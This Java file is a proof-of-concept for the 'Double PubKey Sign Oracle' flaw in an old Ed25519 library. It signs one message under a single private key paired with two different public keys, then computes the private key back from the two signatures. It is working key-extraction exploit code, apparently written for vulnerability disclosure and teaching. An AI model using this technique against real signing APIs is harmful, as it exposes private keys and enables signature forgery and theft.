import cafe.cryptography.curve25519.CompressedEdwardsY;
import cafe.cryptography.curve25519.Scalar;
import cafe.cryptography.ed25519.Ed25519PrivateKey;
import cafe.cryptography.ed25519.Ed25519PublicKey;
import cafe.cryptography.ed25519.Ed25519Signature;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Arrays;
import org.apache.commons.codec.binary.Hex;

/**
 * A demonstration of an "EdDSA Double PubKey Sign Oracle" misuse exploit when an API for EdDSA
 * allows the public key to be provided as input to the sign function along with the private key.
 * Here we demonstrate the exploit on an old version of the cafe.cryptography.ed25519 library
 * version 0.1.0.
 * <p>
 * For more info about the exploit and a list of vulnerable libraries, see <a
 * href="https://github.com/MystenLabs/ed25519-unsafe-libs">https://github.com/MystenLabs/ed25519-unsafe-libs</a>.
 */
public class ExtractKey {

  // Order of Curve25519
  private static final BigInteger L = BigInteger.TWO.pow(252)
      .add(new BigInteger("27742317777372353535851937790883648493"));

  public static void main(String[] arguments)
      throws NoSuchAlgorithmException {

    SecureRandom random = new SecureRandom();
    MessageDigest h = MessageDigest.getInstance("Sha-512");
    byte[] message = "Hello".getBytes();

    // Generate a key pair
    Ed25519PrivateKey privateKey = Ed25519PrivateKey.generate(
        random);
    System.out.println("Secret key 1  = " + Hex.encodeHexString(privateKey.toByteArray()));
    Ed25519PublicKey publicKey = privateKey.derivePublic();
    System.out.println("Public key 1  = " + Hex.encodeHexString(publicKey.toByteArray()));

    // Extract the secret key as a scalar. This is the number we are trying to recover
    Scalar secretKey = bytesToUnclampedBigInteger(
        Arrays.copyOfRange(h.digest(privateKey.toByteArray()), 0, 32));
    System.out.println();

    // Generate a second keypair. We will only use the public key from this pair.
    //Ed25519PrivateKey faultyPrivateKey = Ed25519PrivateKey.generate(
    //    random);
    //System.out.println("Secret key 2  = " + Hex.encodeHexString(faultyPrivateKey.toByteArray()));

    Ed25519PublicKey faultyPublicKey = Ed25519PrivateKey.generate(random).derivePublic();
    System.out.println("Public key 2  = " + Hex.encodeHexString(faultyPublicKey.toByteArray()));
    System.out.println();
    System.out.println("Message       = " + Hex.encodeHexString(message));

    // Sign message with the first key pair
    Ed25519Signature signature = privateKey.expand().sign(message, publicKey);
    CompressedEdwardsY r = new CompressedEdwardsY(
        Arrays.copyOfRange(signature.toByteArray(), 0, 32));
    Scalar s1 = Scalar.fromCanonicalBytes(Arrays.copyOfRange(signature.toByteArray(), 32, 64));
    System.out.println("Signature 1   = (" + Hex.encodeHexString(r.toByteArray()) + ", " + s1 + ")");
    System.out.println("Verifies      = " + publicKey.verify(message, signature));

    // Sign the same message using the same private key but the public key from the second keypair
    // This gives the same first part of the signature (the R), but a different second part, and
    // we will use this to recover the secret key.
    Ed25519Signature faultySignature = privateKey.expand().sign(message, faultyPublicKey);
    CompressedEdwardsY faultyR = new CompressedEdwardsY(
        Arrays.copyOfRange(faultySignature.toByteArray(), 0, 32));
    Scalar s2 = Scalar
        .fromCanonicalBytes(Arrays.copyOfRange(faultySignature.toByteArray(), 32, 64));
    System.out.println(
        "Signature 2   = (" + Hex.encodeHexString(faultyR.toByteArray()) + ", " + s2 + ")");

    // The signature will verify with some probability
    System.out.println("Verifies     = " + faultyPublicKey.verify(message, faultySignature));
    System.out.println();

    // Reconstruct hashes used in the signature algorithm
    h.update(r.toByteArray());
    h.update(publicKey.toByteArray());
    h.update(message);
    byte[] hash = h.digest();
    Scalar e1 = Scalar.fromBytesModOrderWide(hash);

    h.update(faultyR.toByteArray());
    h.update(faultyPublicKey.toByteArray());
    h.update(message);
    byte[] faultyHash = h.digest();
    Scalar e2 = Scalar.fromBytesModOrderWide(faultyHash);

    // Recover the private key from the two signatures
    Scalar recoveredKey = s1.subtract(s2).multiply(invert(e1.subtract(e2)));
    System.out.println("Private key   = " + secretKey);
    System.out.println("Recovered key = " + recoveredKey);

    assert (secretKey.ctEquals(recoveredKey) == 1);
  }

  /**
   * This method extracts the scalar value from a serialized private key. Note that private keys are
   * "clamped" when serialized in Ed25519, so they cannot be extracted directly from the bytes.
   */
  private static Scalar bytesToUnclampedBigInteger(byte[] bytes) {
    byte[] clamped = Arrays.copyOf(bytes, bytes.length);

    // See https://www.jcraige.com/an-explainer-on-ed25519-clamping for a discussion of clamping
    clamped[0] &= 248;
    clamped[31] &= 63;
    clamped[31] |= 64;

    return Scalar.fromBytesModOrder(clamped);
  }

  /**
   * Return a copy of an array with the order of the elements reversed
   */
  private static byte[] reverse(byte[] array) {
    byte[] reverse = new byte[array.length];
    for (int i = 0; i < array.length; i++) {
      reverse[array.length - i - 1] = array[i];
    }
    return reverse;
  }

  /**
   * Compute the multiplicative inverse of a scalar mod the order of Curve25519
   */
  private static Scalar invert(Scalar x) {
    BigInteger inverseAsBigInteger = new BigInteger(reverse(x.toByteArray())).modInverse(L);
    return Scalar.fromBytesModOrder(reverse(inverseAsBigInteger.toByteArray()));
  }
}
